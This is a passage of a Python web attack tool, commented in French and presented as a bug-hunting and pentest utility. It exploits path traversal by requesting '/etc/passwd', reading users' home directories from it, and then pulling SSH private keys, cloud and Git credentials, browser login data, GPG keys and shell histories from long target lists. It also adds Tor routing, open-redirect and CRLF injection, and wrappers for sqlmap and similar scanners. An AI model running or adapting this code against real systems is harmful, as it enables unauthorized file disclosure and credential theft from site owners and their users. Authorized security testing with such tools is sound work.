    "../../../../../../var/log/syslog",               # Debian/Ubuntu
    "../../../../../../var/log/messages",             # RedHat/CentOS
    "../../../../../../var/log/auth.log",             # Authentification
    "../../../../../../var/log/secure",               # Sécurité (RedHat)
    "../../../../../../var/log/dmesg",                # Logs kernel
    "../../../../../../var/log/apache2/error.log",    # Logs Apache Debian/Ubuntu
    "../../../../../../var/log/httpd/error_log",      # Logs Apache RedHat
    "../../../../../../var/log/nginx/error.log",      # Logs Nginx
    "../../../../../../var/log/mysql/error.log",      # Logs MySQL

    # ==============================
    # 4. FICHIERS WEB
    # ==============================
    "../../../../../../var/www/html/index.html",      # Page par défaut
    "../../../../../../var/www/html/index.php",       # Page PHP
    "../../../../../../var/www/html/config.php",      # Config PHP
    "../../../../../../etc/apache2/apache2.conf",     # Config Apache Debian/Ubuntu
    "../../../../../../etc/httpd/conf/httpd.conf",    # Config Apache RedHat
    "../../../../../../etc/nginx/nginx.conf",         # Config Nginx
    "../../../../../../etc/php/7.4/apache2/php.ini",  # PHP config (Debian/Ubuntu exemple)
    "../../../../../../etc/php/8.1/fpm/php.ini",      # PHP config (Debian/Ubuntu récent)
    "../../../../../../etc/php.ini",                  # PHP config générique

    # ==============================
    # 5. BASES DE DONNÉES (SQL)
    # ==============================
    "../../../../../../var/lib/mysql/mysql/user.MYD",       # MySQL users
    "../../../../../../var/lib/mysql/mysql/user.frm",       # MySQL users structure
    "../../../../../../var/lib/mysql/mysql.db",             # DB principales
    "../../../../../../var/lib/mysql/mysql/user.ibd",       # Table user
    "../../../../../../var/lib/mysql/ibdata1",              # Données globales MySQL
    "../../../../../../var/lib/mysql/ib_logfile0",          # Logs InnoDB
    "../../../../../../var/lib/mysql/ib_logfile1",          # Logs InnoDB
    "../../../../../../etc/mysql/my.cnf",                   # Config MySQL (Debian/Ubuntu)
    "../../../../../../etc/my.cnf",                         # Config MySQL générique
    "../../../../../../var/lib/postgresql/data/pg_hba.conf",# Config PostgreSQL
    "../../../../../../var/lib/postgresql/data/postgresql.conf", # Config PostgreSQL
    "../../../../../../var/lib/postgresql/data/base",       # Bases PostgreSQL
    "../../../../../../data/data/com.mysql/databases.db",   # MySQL sur Android
    "../../../../../../var/www/html/db.sqlite3",            # SQLite Django
    "../../../../../../var/www/html/database.sqlite",       # SQLite générique
    "../../../../../../var/www/html/storage/database.sqlite", # Laravel SQLite
    "../../../../../../var/www/html/db.sql",
    "../../../../../../var/www/html/backup.sql",
    "../../../../../../var/lib/mongodb/mongod.lock",
    "../../../../../../var/lib/redis/dump.rdb",
    "../../../../../../var/www/html/sql_dump.sql",
    "../../../../../../var/www/html/backup/db_backup.sql",
    
    # ==============================
    # 6. CMS POPULAIRES
    # ==============================

    # WordPress
    "../../../../../../var/www/html/wp-config.php",         # Config WordPress
    "../../../../../../var/www/html/wp-content/uploads",    # Uploads WP
    "../../../../../../var/www/html/wp-includes/version.php", # Version WP

    # Drupal
    "../../../../../../var/www/html/sites/default/settings.php",

    # Joomla
    "../../../../../../var/www/html/configuration.php",

    # Magento
    "../../../../../../var/www/html/app/etc/env.php",

    # Laravel
    "../../../../../../var/www/html/.env",                  # Config Laravel
    "../../../../../../var/www/html/storage/logs/laravel.log",

    # Django
    "../../../../../../var/www/html/settings.py",           # Django settings

    # ==============================
    # 7. FICHIERS SENSIBLES GÉNÉRIQUES
    # ==============================
    "../../../../../../.env",                               # Fichier d'env générique
    "../../../../../../config.json",                        # Config JSON générique
    "../../../../../../config.php",                         # Config PHP générique
    "../../../../../../settings.py",                        # Config Django
    "../../../../../../database.yml",                       # Rails config DB
    "../../../../../../composer.json",                      # PHP dépendances
    "../../../../../../package.json",                       # NodeJS dépendances
    "../../../../../../.git/config",                        # Config Git
    "../../../../../../.htaccess",                          # Fichier Apache
    "../../../../../../.htpasswd",                          # Mots de passe Apache

    # ==============================
    # 8. CRON JOBS
    # ==============================
    "../../../../../../etc/crontab",
    "../../../../../../var/spool/cron/root",
    "../../../../../../var/spool/cron/crontabs/root",
    
    # ==============================
    # 9. OTHERS
    # ==============================
    "../.htaccess", "../../.htaccess",
    "../.htpasswd", "../../.htpasswd",
    "../.user.ini", "../../.user.ini",
    "../web.config", "../../web.config",
    
    # Fichiers config
    "../.env", "../../.env",
    "../config.php", "../../config.php",
    "../settings.php", "../../settings.php",
    "../wp-config.php", "../../wp-config.php",
    "../configuration.php", "../../configuration.php",
    "../env.php", "../../env.php",

    # Logs
    "../error.log", "../../error.log",
    "../debug.log", "../../debug.log",
    "../laravel.log", "../../laravel.log",

    # Backups
    "../backup.zip", "../../backup.zip",
    "../config.php.bak", "../../config.php.bak",
    "../wp-config.php.old", "../../wp-config.php.old",

    # Credentials
    "../.git/config", "../../.git/config",
    "../.ssh/id_rsa", "../../.ssh/id_rsa",
    "../.aws/credentials", "../../.aws/credentials",

    # CMS
    "../wp-content/debug.log", "../../wp-content/debug.log",
    "../sites/default/settings.php", "../../sites/default/settings.php",
    "../storage/logs/laravel.log", "../../storage/logs/laravel.log",

    # Temp
    "../debug.php", "../../debug.php"
    
]


path_to_home = [
    # ===============================
    # 1. HISTORIQUES DE COMMANDES
    # ===============================
    ".bash_history",        # Historique des commandes bash
    ".zsh_history",         # Historique pour Zsh
    ".mysql_history",       # Commandes MySQL (souvent avec mots de passe !)
    ".psql_history",        # Commandes PostgreSQL
    ".sqlite_history",      # Commandes SQLite
    ".php_history",         # Historique des commandes PHP CLI

    # ===============================
    # 2. CLES SSH & ACCES REMOTE
    # ===============================
    ".ssh/authorized_keys", # Clés autorisées SSH
    ".ssh/id_rsa",          # Clé privée SSH
    ".ssh/id_rsa.pub",      # Clé publique SSH
    ".ssh/config",          # Config SSH
    ".ssh/known_hosts",     # Machines déjà connectées

    # ===============================
    # 3. CONFIGURATION DU SHELL
    # ===============================
    ".bashrc",
    ".profile",
    ".bash_profile",
    ".bash_logout",
    ".zshrc",
    ".cshrc",
    ".kshrc",
    ".login",
    ".logout",

    # ===============================
    # 4. CONFIGURATION D'APPLICATIONS
    # ===============================
    ".gitconfig",           # Config Git
    ".git-credentials",     # Identifiants Git (tokens souvent en clair)
    ".docker/config.json",  # Tokens Docker Hub / Registry
    ".npmrc",               # Tokens NPM
    ".composer/auth.json",  # Tokens Composer
    ".aws/credentials",     # Credentials AWS
    ".gcloud/credentials.db", # GCP Tokens

    # ===============================
    # 5. FICHIERS DE BASE DE DONNÉES LOCAUX
    # ===============================
    "db.sqlite3",
    "database.sqlite",
    ".local/share/db.sqlite3",
    ".config/dbeaver-data-sources.xml", # Config DBeaver avec credentials
    ".config/pgadmin/pgadmin4.db",     # PostgreSQL pgAdmin config

    # ===============================
    # 6. FICHIERS DE NAVIGATEURS (SESSIONS, TOKENS)
    # ===============================
    ".mozilla/firefox/profiles.ini",
    ".config/google-chrome/Default/Login Data",
    ".config/google-chrome/Default/Cookies",

    # ===============================
    # 7. HISTORIQUES ET JOURNAUX
    # ===============================
    ".viminfo",             # Historique vim (souvent chemins de fichiers sensibles)
    ".lesshst",             # Historique de less
    ".python_history",      # Historique Python REPL
    ".wget-hsts",           # Historique wget
    ".curlrc",              # Config curl (parfois avec tokens)

    # ===============================
    # 8. CLÉS GPG
    # ===============================
    ".gnupg/pubring.kbx",   # Clés publiques GPG
    ".gnupg/secring.gpg",   # Clés privées GPG
    ".gnupg/private-keys-v1.d/",

    # ===============================
    # 9. AUTRES
    # ===============================
    ".netrc",               # Identifiants pour FTP, HTTP, etc.
    ".config/Code/User/settings.json", # Config VS Code
    ".config/Code/User/keybindings.json",
    ".config/slack/",       # Tokens Slack
    ".local/share/keyrings/", # GNOME Keyring (tokens, mdp chiffrés)


    # Shell / historique
    ".zprofile",
    ".bash_logout",
    ".zlogout",
    ".history",

    # SSH
    ".ssh/id_dsa",
    ".ssh/id_ecdsa",
    ".ssh/id_ed25519",

    # Environnements / secrets
    ".env",
    ".gnupg/trustdb.gpg",

    # Dépendances / configs dev
    ".yarnrc",
    ".composer/config.json",
    ".pip/pip.conf",

    # Applications / navigateurs
    ".mozilla/firefox/profiles.ini",
    ".config/google-chrome/Default/Preferences",
    ".config/google-chrome/Default/Login Data",

    # Logs / caches
    ".cache/",
    ".local/share/",
    ".config/",
    ".node_repl_history",

    # Fichiers de sauvegarde ou temporaires
    ".backup"    
]


def get_response_signature(url, cookies):
    global proxies
    
    try:
        # Gestion des User-Agents aléatoires
        if user_agents == "yes":
            headersX = loadit("payloads/user_agents.txt")
            headers = {
                "User-Agent": random.choice(headersX)
            }
        else:
            headers = None

        cookies = cookies or {}

        # Activation du proxy TOR si nécessaire
        if torusage == "yes":
            proxies = tor_proxies

        # Requête avec redirection activée
        r = requests.get(
            url,
            headers=headers,
            cookies=cookies,
            proxies=proxies,
            timeout=5,
            allow_redirects=True
        )

        # Détection des redirections trop nombreuses
        if len(r.history) > 5:
            print(f"{R}[!] Too many redirects - treating as 404")
            return {
                "status_code": 404,
                "length": 0,
                "snippet": ""
            }

        # Taille de la réponse
        response_length = len(r.content)

        # Si la réponse est vide → considéré comme not found
        if response_length == 0:
            print(f"{M}[-] Empty response - treating as 404")
            return {
                "status_code": 404,
                "length": 0,
                "snippet": ""
            }

        return {
            "status_code": r.status_code,
            "length": response_length,
            "snippet": r.text  # Affiche seulement les 500 premiers caractères
        }

    except requests.TooManyRedirects:
        print(f"{R}[!] Too many redirects (exception) - treating as 404")
        return {
            "status_code": 404,
            "length": 0,
            "snippet": ""
        }

    except requests.RequestException as e:
        print(f"{R}[!] Request error : {e}")
        return None


def check_traversal_paths(BASE_URL, method, cookies, max_threads):
    print(f"{C}[*] Getting baseline response (non-existent file) ...")
    baseline_url = BASE_URL + NON_EXISTENT_PATH
    baseline = get_response_signature(baseline_url, cookies)

    if not baseline:
        print(f"{R}[!] Unable to get baseline response, stopping.")
        return

    print(f"{C}[*] Baseline - HTTP Code : {baseline['status_code']}, Size : {baseline['length']}")

    # ===============================
    # 1. HOME DIRS avec etc/passwd
    # ===============================
    found_files1 = []

    if method == "Linux":
        print(f"{C}[*] Testing users home paths if etc/passwd aviable (simple encoded url obfuscation) ...")
        encoded_path = quote("../../../../../../etc/passwd", safe="")
        test_url = BASE_URL + encoded_path
        result = get_response_signature(test_url, cookies)

        if not result:
            print(f"{M}[-] Not found ...")
        else:
            home_dirs = []
            etc_results = result

            # Parse etc/passwd pour trouver les répertoires /home
            for line in result['snippet'].strip().splitlines():
                parts = line.split(":")
                if len(parts) >= 6:
                    username = parts[0]
                    home = parts[5]

                    if home.startswith("/home/"):
                        home_dirs.append((username, home))

            for user, home in home_dirs:
                print(f"{G}[+] User : {Y}{user}")

            # --- Multithread sur les fichiers dans les homes ---
            def test_home_file(user, home, sensitive_file):
                path = f"{home}/{sensitive_file}"
                encoded_path = quote("../../../../../.." + path, safe="")
                test_url = BASE_URL + encoded_path
                result = get_response_signature(test_url, cookies)

                if not result:
                    return None

                # Comparaison avec la baseline
                if (result['status_code'] != baseline['status_code']) or (result['length'] != baseline['length']):
                    if result['status_code'] != 404:
                        print(f"{G}[+] Potential file found : {Y}{path}")
                        return {
                            "path": path,
                            "status_code": result['status_code'],
                            "length": result['length'],
                            "snippet": result['snippet']
                        }
                    else:
                        print(f"{M}[-] Status code 404 or treated as 404 : {Y}{path}")
                else:
                    print(f"{M}[-] No difference for : {Y}{path}")
                return None

            # ThreadPool pour tester les fichiers sensibles dans les home dirs
            with ThreadPoolExecutor(max_threads) as executor:
                futures = [
                    executor.submit(test_home_file, user, home, sensitive_file)
                    for user, home in home_dirs
                    for sensitive_file in path_to_home
                ]

                for future in as_completed(futures):
                    res = future.result()
                    if res:
                        found_files1.append(res)

            print(f"{G}\n--- etc/passwd ---")
            print(f"{G}HTTP Code  : {R}{etc_results['status_code']}")
            print(f"{G}Size       : {R}{etc_results['length']}")
            print(f"{Y}{etc_results['snippet']}\n{G}")
            print("-"*60)

    # ===== Affichage final pour les home dirs =====
    print(f"\n{Y}" + "="*60)
    print(f"{C}[#] Final Report for Users Home Path Traversal Test{Y}")
    print("="*60)

    if found_files1:
        print(f"{G}[+] Total files found: {len(found_files1)}\n")
        for idx, file in enumerate(found_files1, start=1):
            print(f"{G}--- File {idx} ---")
            print(f"{G}Path       : {Y}{file['path']}")
            print(f"{G}HTTP Code  : {R}{file['status_code']}")
            print(f"{G}Size       : {R}{file['length']}")
            print(f"{Y}{file['snippet']}\n{G}")
            print("-"*60)
        print("")
    else:
        print(f"{R}[!] No files were found matching known traversal paths.\n")

    # ===============================
    # 2. PATHS GÉNÉRIQUES / CONNUS
    # ===============================
    print(f"{C}[*] Testing known paths (simple encoded url obfuscation) ...")

    paths_to_test = COMMON_PATHS_windows if method == "Windows" else COMMON_PATHS_linux
    found_files = []

    def test_known_path(path):
        encoded_path = quote(path, safe="")
        test_url = BASE_URL + encoded_path
        result = get_response_signature(test_url, cookies)

        if not result:
            return None

        if (result['status_code'] != baseline['status_code']) or (result['length'] != baseline['length']):
            if result['status_code'] != 404:
                print(f"{G}[+] Potential file found : {Y}{path}")
                return {
                    "path": path,
                    "status_code": result['status_code'],
                    "length": result['length'],
                    "snippet": result['snippet']
                }
            else:
                print(f"{M}[-] Status code 404 or treated as 404 : {Y}{path}")
        else:
            print(f"{M}[-] No difference for : {Y}{path}")
        return None

    # Multithreading sur les paths connus
    with ThreadPoolExecutor(max_threads) as executor:
        futures = [executor.submit(test_known_path, path) for path in paths_to_test]

        for future in as_completed(futures):
            res = future.result()
            if res:
                found_files.append(res)

    # ===== Affichage final =====
    print(f"\n{Y}" + "="*60)
    print(f"{C}[#] Final Report for Path Traversal Test{Y}")
    print("="*60)

    if found_files:
        print(f"{G}[+] Total files found: {len(found_files)}\n")
        for idx, file in enumerate(found_files, start=1):
            print(f"{G}--- File {idx} ---")
            print(f"{G}Path       : {Y}{file['path']}")
            print(f"{G}HTTP Code  : {R}{file['status_code']}")
            print(f"{G}Size       : {R}{file['length']}")
            print(f"{Y}{file['snippet']}\n{G}")
            print("-"*60)
    else:
        print(f"{R}[!] No files were found matching known traversal paths.\n")
    
    
    
###############################################################################################################
################################################### main menu #################################################
###############################################################################################################


def main():
    global verbosity, user_agents, urls_file, proxies, torusage
    clear_screen()
    print(banner)
    
    parser = argparse.ArgumentParser(description="Advanced Bug Hunting and Pentest Tool")
    parser.add_argument("-hh", "--help_verbose", action="store_true", help="Show advenced help mode (Default modes on dalfox, nuclei and sqlmap without parameters, dalfox help menu, nuclei help menu and sqlmap help menu)")
    parser.add_argument("-u", "--url", help="Target URL to scan")
    parser.add_argument("-f", "--file", help="Load urls from file (works with --traversal --open-redirect and --crlf)")
    parser.add_argument("--cookies", default="", help="Set custom cookies (format: key1=value1; key2=value2)'")
    parser.add_argument("--headers", action="store_true", help="Random user headers for each requests")
    parser.add_argument("--proxie", help="Use a proxie (ex : http://152.228.154.20:8080 or socks4://176.31.110.126:1080)")
    parser.add_argument("--tor", action="store_true", help="Setup tor network (socks5h://127.0.0.1:9050). If torsocks or other used no need to enable that feature. Be aware that --sqlmap, --dalfox and --nuclei will not be torified with --tor args. Consider using torsocks for that")
    parser.add_argument("--ip-check", action="store_true", help="Check global ip configuration for all the tool (--sqlmap, --dalfox and --nuclei too)")
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose mode")
    parser.add_argument("-e", "--extract", action="store_true", help="extract links from url")
    parser.add_argument("-d", "--depth", type=int, default=1, help="Crawling depth (default: 1)")
    parser.add_argument('--wtf', action="store_true", help=f"Search for stored infos as emails, tokens, phone numbers, api keys, etc ...")
    parser.add_argument("-w", "--wayback", action="store_true", help="Include Wayback Machine URLs")
    parser.add_argument("-r", "--robots", action="store_true", help="Try to extract urls from robots.txt and sitemap.xml")
    parser.add_argument("-n", "--normalize", action="store_true", 
                        help="Normalize common parameters into a unique format, such as 'id=X' to prevent duplicates (ex : id=1256 ; id=15 ; id=897)")
    parser.add_argument("-a", "--show-all", action="store_true", help="extract all links")
    parser.add_argument("--exclude", nargs='+',
                        help="Exclude specifics parameters like id=X or ?image=X or something.php (ex : --exclude image,id,php)", default=[])
    parser.add_argument("-o", "--output", help="Output file to save extracted results (-e ; -w ; --robots)")                    
    parser.add_argument("-wp", "--wordpress", action="store_true", help="Full WordPress scan with no limitations for vulnerable version detection")
    parser.add_argument("-s", '--subdomains', action="store_true", help=f"Enum target subdomains")
    parser.add_argument("-t", '--traversal', action="store_true", help=f"Try to exploit path traversal. Payloads into payloads/traversal.txt")
    parser.add_argument("-op", '--open-redirect', action="store_true", help=f"Try to exploit path open redirect. Payloads into payloads/open_redirect.txt")
    parser.add_argument("-cr", '--crlf', action="store_true", help=f"Try to exploit crlf injection. Payloads into payloads/crlf.txt")
    parser.add_argument("-i", '--infos', action="store_true", help=f"Check basics webpage infos (headers, vulnerable source or sinks, Click-Hijacking, ...)")
    parser.add_argument("--vuln", action="store_true", help=f"Check somme vulns in passive mode (next.js middleware)")
    parser.add_argument("--traversal-windows", action="store_true", help=f"Testing different default files for path traversal on a Windows server")
    parser.add_argument("--traversal-linux", action="store_true", help=f"Testing different default files for path traversal on a Linux server")
    parser.add_argument("--dalfox", action="store_true", help="Use dalfox")
    parser.add_argument("--sqlmap", action="store_true", help="Use sqlmap")
    parser.add_argument("--nuclei", action="store_true", help="Use nuclei")
    parser.add_argument("--wpscan", action="store_true", help="Use wpscan (need sudo rights)")
                        
    args = parser.parse_args()


    if len(sys.argv) == 1:
        parser.print_usage()
        sys.exit()

    
    if args.help_verbose:
        parser.print_help()
        help_annex()


    if args.ip_check:
        if args.tor:
            torusage = "yes"
        if not (args.url or args.file):
            lanch = "no"
        else:
            lanch = "yes"
            
        check_ips(lanch)


    if not (args.url or args.file):
        parser.error("You must specify your search query")

    if args.url and args.file:
        parser.error("You cannot specify both --url and --file at the same time")

    conflicting_args = [
        "url", "cookies", "headers", "thread", "verbose", "extract", "depth",
        "wayback", "robots", "normalize", "show_all", "exclude", "output", "wordpress", 
        "subdomains", "infos"
    ]

    if args.file:
        # Check if any conflicting argument is selected with --file
        for arg in conflicting_args:
            if getattr(args, arg):
                parser.error(f"You cannot use --file with --{arg.replace('_', '-')}")

    if args.tor and args.proxie:
        parser.error("You cannot specify both --tor and --proxie at the same time")
        

    if args.sqlmap:
        confirm = input(f"\n{M}[Info] {G}Do you want to add parameters for sqlmap (y/n/h) : {Y}").strip()
        if confirm.lower() in ['y', 'yes']:
            setup_parameters_sqlmap = input(f"{M}[Info] {G}Add parameters for sqlmap (ex : -v --skip-waf --risk=3 --level=5 --dbs) or use nothing for default scanning :\n{Y}")
        elif confirm.lower() in ['n', 'no']:
            setup_parameters_sqlmap = ""
        elif confirm.lower() in ['h', 'help']:
            clear_screen()
            print(banner)
            help_annex()
        else:
            print(f"{M}[Info] {R}Invalid choice. sqlmap parametters set to default")
            setup_parameters_sqlmap = ""


    if args.dalfox:
        confirm = input(f"\n{M}[Info] {G}Do you want to add parameters for dalfox (y/n/h) : {Y}").strip()
        if confirm.lower() in ['y', 'yes']:
            setup_parameters_dalfox = input(f"{M}[Info] {G}Add parameters for dalfox (ex : -w 15 --timeout 20) or use nothing for default scanning :\n{Y}")
        elif confirm.lower() in ['n', 'no']:
            setup_parameters_dalfox = ""
        elif confirm.lower() in ['h', 'help']:
            clear_screen()
            print(banner)
            help_annex()
        else:
            print(f"{M}[Info] {R}Invalid choice. dalfox parametters set to default")
            setup_parameters_dalfox = ""


    if args.nuclei:
        confirm = input(f"\n{M}[Info] {G}Do you want to add parameters for nuclei (y/n/h) : {Y}").strip()
        if confirm.lower() in ['y', 'yes']:
            setup_parameters_nuclei = input(f"{M}[Info] {G}Add parameters for nuclei (ex : -v -rl 15) or use nothing for default scanning :\n{Y}")
        elif confirm.lower() in ['n', 'no']:
            setup_parameters_nuclei = ""
        elif confirm.lower() in ['h', 'help']:
            clear_screen()
            print(banner)
            help_annex()
        else:
            print(f"{M}[Info] {R}Invalid choice. nuclei parametters set to default")
            setup_parameters_nuclei = ""


    if args.wpscan:
        if os.name == "posix" and os.geteuid() != 0:
            print(f"{M}[Info] {R}This program must be run as root ton launch wpscan")
            rootornot = "no"
        else:
            rootornot = "yes"
            confirm2 = input(f"\n{M}[Info] {G}Do you want to use token file and add the command  --api-token content_of_the_token_file (y/n/h) : {Y}").strip()
            if confirm2.lower() in ['y', 'yes']:
                token_file_path = os.path.join("install_paths", "wpscan_token.txt") 
                with open(token_file_path, 'r', encoding='utf-8') as token_file:
                    token_lines = [line.strip() for line in token_file.readlines() if line.strip()]
                if token_lines:
                    token = token_lines[0]
                    setup_token_wpscan = f"--api-token {token}"
                    print(f"{M}[Info] {G}Token ({token}) loaded successfully and added to the command")
                else:
                    print(f"{M}[Info] {R}Token file is empty. wpscan parameters set to default")
                    setup_token_wpscan = ""            
            elif confirm2.lower() in ['n', 'no']:
                setup_token_wpscan = ""
            elif confirm2.lower() in ['h', 'help']:
                clear_screen()
                print(banner)
                help_annex()
            else:
                print(f"{M}[Info] {R}Invalid choice. wpscan parametters set to default")
                setup_token_wpscan = ""
            
            confirm = input(f"\n{M}[Info] {G}Do you want to add parameters for wpscan (y/n/h) : {Y}").strip()
            if confirm.lower() in ['y', 'yes']:
                setup_parameters_wpscan = input(f"{M}[Info] {G}Add parameters for wpscan (ex : -e vp) or use nothing for default scanning :\n{Y}")
            elif confirm.lower() in ['n', 'no']:
                setup_parameters_wpscan = setup_token_wpscan
            elif confirm.lower() in ['h', 'help']:
                clear_screen()
                print(banner)
                help_annex()
            else:
                print(f"{M}[Info] {R}Invalid choice. wpscan parametters set to default")
                setup_parameters_wpscan = setup_token_wpscan

    if args.tor:
        check_tor_connection()
    
    
    if args.proxie:
        proxie_setup(args.proxie)
        try:
            print(f"{M}[Info] {G}Testing : {proxies}")

            response = requests.get("http://httpbin.org/ip", proxies=proxies, timeout=20)
            
            if response.status_code == 200:
                print(f"{M}[Info] {G}Proxy is valid : {response.json()}\n")
            else:
                print(f"{M}[Error] {R}Invalid : {proxy}")
                sys.exit()
        except requests.exceptions.ProxyError:
            print(f"{M}[Error] {R}ProxyError for {proxy}")
            sys.exit()
        except requests.exceptions.ConnectTimeout:
            print(f"{M}[Error] {R}Timeout for {proxy}")
            sys.exit()
        except requests.exceptions.RequestException as e:
            print(f"{M}[Error] {R}General issue for {proxy} : {e}")
            sys.exit()
    
    
    if args.headers:
        user_agents = "yes"
    else:
        user_agents = "No"
    
    if args.verbose:
        verbosity = "yes"
    else:
        verbosity = "no"

    
    cookies = parse_cookies(args.cookies) if args.cookies else {}


    if args.traversal_windows:
        check_traversal_paths(args.url, "Windows", cookies, max_threads=7)
    
    if args.traversal_linux:
        check_traversal_paths(args.url, "Linux", cookies, max_threads=7)
    

    if args.file:
        urls_from_file = loadit(args.file)
        outputlist.update(urls_from_file)    
    
    if args.wayback or args.extract:
        print(f"\n{M}[Info] {C}Starting scan on {Y}'{C}{args.url}{Y}'\n")

    # Initialize sets for storing links
    all_links = set()
    crawled_links = set()

    # Fetch and crawl
    def crawl(url, current_depth, cookies):
        if url in crawled_links or current_depth > args.depth:
            return
        if verbosity == "yes":
            print(f"{M}[Crawl] {G}{url}")
            
        page_content = fetch_page(url, cookies)
        crawled_links.add(url)

        links = extract_links(args.url, page_content)
        all_links.update(links)

        for link in links:
            crawl(link, current_depth + 1, cookies)

    if args.extract:
        print(f"{M}[Info] {G}Crawling {Y}{args.url} {G}...")
        crawl(args.url, 0, cookies)
        


    # Include Wayback URLs if requested
    if args.wayback:
        print(f"\n{M}[Info] {G}Fetching Wayback Machine URLs...")
        wayback_links = wayback_urls(args.url)
        all_links.update(wayback_links)

    if args.wayback or args.extract:
        print(f"\n{M}[Info] {G}Found {Y}{len(all_links)} {G}links")

        # Exclude URLs with parameters listed in --exclude
        exclude_params = set(args.exclude)

        # Find sensitive parameters in links
        print(f"{M}[Info] {G}Identifying links with sensitive parameters...")
        interesting_links = find_urls_with_params_and_php(all_links)
        interesting_links_with_params = [entry for entry in interesting_links if entry['params']]  # Assurez-vous que 'params' existe


        # Store normalized URLs in a set to avoid duplicates
        normalized_urls = set()
        printed_urls = set()  # Track URLs that have been printed
        display_count = 0

        print(f"{M}[Info] {G}Found {Y}{len(interesting_links_with_params)} {G}Interesting links")

    if args.exclude:
        print(f"{M}[Info] {G}Parameters filter set to : {Y}{args.exclude}")
    
    if args.normalize:
        print(f"{M}[Info] {G}Normalizing links ...")
    
    print("")

    outputlist = set()
    if args.wayback or args.extract:
        if args.normalize:
            for entry in interesting_links:
                normalized = normalize_url_parameters([entry['url']])[0]

                # Filter out links with excluded parameters
                if entry['params'] and any(param in exclude_params for param in entry['params']):
                    continue  # Skip this entry

                normalized_urls.add(normalized)

                # Check if the normalized URL has been printed before
                if normalized not in printed_urls:
                    printed_urls.add(normalized)
                    if entry['params']:
                        print(f"{M}[Interesting]   - {G}{normalized} {M}- {Y}{entry['params']}")
                        display_count += 1
                        outputlist.add(normalized)
                    elif args.show_all:
                        print(f"{M}[No parameters] - {G}{normalized}")
                        display_count += 1
                        outputlist.add(normalized)
        else:
            for entry in interesting_links:
                # Exclude URLs with excluded parameters
                if entry['params'] and any(param in exclude_params for param in entry['params']):
                    continue  # Skip this entry

                # For non-normalized URLs, add them to printed_urls
                if entry['url'] not in printed_urls:
                    printed_urls.add(entry['url'])
                    if entry['params']:
                        print(f"{M}[Interesting]   - {G}{entry['url']} {M}- {Y}{entry['params']}")
                        display_count += 1
                        outputlist.add(entry['url'])
                    elif args.show_all:
                        print(f"{M}[No parameters] - {G}{entry['url']}")
                        display_count += 1
                        outputlist.add(entry['url'])

        if args.show_all:
            print(f"\n{M}[Info] {G}Displaying crawl from {Y}https://api.hackertarget.com/pagelinks/?q={args.url}\n")
            count = fetch_pagelinks(args.url, cookies)
            display_count += count
            
        print(f"\n{M}[Info] {G}Displayed {Y}{display_count} {G}links")
        if not args.robots:
            print(f"{M}[Info] {Y}End of extract\n")

    if args.robots:
        print(f"\n{M}[Info] {C}Searching for robots and sitemap urls")
        parsed_url = urlparse(args.url)
        domain = parsed_url.netloc

        extracted = tldextract.extract(domain)
        base_domain = f"{extracted.domain}.{extracted.suffix}"

        #robots(base_domain)
        found_urls = robots(base_domain, cookies)
        extract_robots = set()
        
        if found_urls:
            for url in found_urls:
                if args.normalize:
                    normalized = normalize_url_parameters([url])[0]
                    if normalized not in extract_robots:
                        extract_robots.add(normalized)
                        print(f"{M}[+] {G}{normalized}")
                else:
                    extract_robots.add(url)
                    print(f"{M}[+] {G}{url}")
            print(f"\n{M}[Info] {G}Found {Y}{len(extract_robots)} {G}links")
            outputlist.update(extract_robots)
        else:
            print(f"\n{M}[Info] {G}Found {Y}0 {G}links")
            
        print(f"{M}[Info] {Y}End of extract\n")

    if not (args.wayback or args.robots or args.extract):
        outputlist.add(args.url)

    if args.wordpress:
        print(f"\n{M}[Info] {C}Start WordPress Scan ...\n")
        url = args.url
        if not url.endswith("/"):
            url += "/"

        # List of common WordPress sensitive directories and files to check (###### add more here if needed ######)
        paths_to_check = [
            "wp-admin/",
            "wp-login.php",
            "wp-content/uploads/",
            "wp-json/wp/v2/users",
            "wp-json/wp/v2/settings",
            "wp-json/wp/v2/posts",
            "wp-includes/",
            "wp-config.php",
            "wp-cron.php",
            "readme.html",
            "robots.txt",
            "sitemap_index.xml",
            "wp-sitemap.xml",
            "license.txt",
            "xmlrpc.php"
        ]
        detect_wordpress_version(url, cookies)
        check_wordpress_paths(url, paths_to_check, cookies)

    if args.subdomains:
        print(f"\n{M}[Info] {C}Searching for subdomains ...")
        parsed_url = urlparse(args.url)
        domain = parsed_url.netloc

        extracted = tldextract.extract(domain)
        base_domain = f"{extracted.domain}.{extracted.suffix}"
        subreponse2(base_domain)


    if args.traversal:
        #seen_status_codes.clear()
        payloads = loadit("payloads/traversal.txt")
        print(f"\n{M}[Info] {C}Searching for path traversal vulnerabilities ...")
        print(f"{M}[Info] {G}[Code_Status] payload injected (Target : {Y}{args.url})")
        print(f"{M}[Info] {G}Check [dif : bytes] in response for false positives\n")
        for payload in payloads:
            for links in outputlist:
                test_path_traversal(links, payload, cookies)

    if args.open_redirect:
        seen_status_codes.clear()
        payloads = loadit("payloads/open_redirect.txt")
        for links in outputlist:
            injected_urls = inject_open_redirect(links, payloads)
            test_injected_urls(injected_urls, cookies)        

    if args.crlf:
        payloads = loadit("payloads/crlf.txt")

        if payloads:
            url = args.url
            
            if not (url.startswith("http://") or url.startswith("https://")):
                url = 'http://' + url
            
            # Check if the URL contains '=' and prepare the target and control URLs
            if "=" in url:
                base_url, _, _ = url.partition("=")
                target_url = base_url + "="

            crlfScan(url, payloads, cookies, outputlist)

    if args.infos:
        parsed_url = urlparse(args.url)
        domain = parsed_url.netloc
        extracted = tldextract.extract(domain)
        base_domain = f"{extracted.domain}.{extracted.suffix}"        
        audit_page(args.url, cookies)
        
        # TRACE request ...
        host = parsed_url.hostname
        path = parsed_url.path if parsed_url.path else "/"
        conn = http.client.HTTPConnection(host)
        conn.request("TRACE", path)
        response = conn.getresponse()
        print(f"\n{M}[Info] {G}TRACE request :")
        print(f"{M}[+] {G}Statut  :{Y}", response.status)
        print(f"{M}[+] {G}Headers ...")
        version_pattern = re.compile(
            r"("
            r"PHP|ASP\.NET|Apache|nginx|LiteSpeed|IIS|Node\.js|Express|"
            r"Django|Flask|Laravel|Symfony|Spring|Jetty|Tomcat|"
            r"WordPress|Joomla|Drupal|Magento|Shopify|Wix|Squarespace|Prestashop|"
            r"Ubuntu|Debian|CentOS|Red Hat|Fedora|Alpine|Windows|FreeBSD|OpenBSD|"
            r"OpenSSL|LibreSSL|BoringSSL|cURL|wget|"
            r"AWS|Amazon|CloudFront|Cloudflare|Akamai|Fastly|"
